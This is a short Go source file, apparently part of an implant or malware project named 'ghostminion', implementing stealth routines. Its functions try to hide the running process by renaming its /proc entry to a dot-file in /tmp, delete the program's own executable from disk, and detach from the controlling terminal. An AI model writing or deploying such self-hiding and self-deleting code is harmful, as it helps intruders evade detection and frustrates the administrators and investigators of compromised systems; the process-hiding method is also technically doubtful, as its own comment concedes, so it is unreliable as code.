package hider

import (
	"ghostminion/logger"
	"os"
	"strconv"
	"golang.org/x/sys/unix"
)

var lgr = logger.GetLogger()

func Hide() {
	lgr.Debug("Hiding process begins")
	err := hideProcess()
	if err != nil {
		lgr.Error("Error hiding process:", err.Error())
	}
	err = deleteSelf()
	if err != nil {
		lgr.Error("Error deleting self:", err.Error())
	}
}

func hideProcess() error {
	// needs more research (probably won't work if you are not root?)
	pid := os.Getpid()
	newName := "/tmp/." + strconv.Itoa(pid)
	oldPath := "/proc/" + strconv.Itoa(pid)
	if err := os.Rename(oldPath, newName); err != nil {
		return err
	}
	return nil
}

func deleteSelf() error {
	if exe, err := os.Executable(); err != nil {
		return err
	} else if err = os.Remove(exe); err != nil {
		return err
	}
	return nil
}

func Detach() {
	_, _ = unix.Setsid()
}
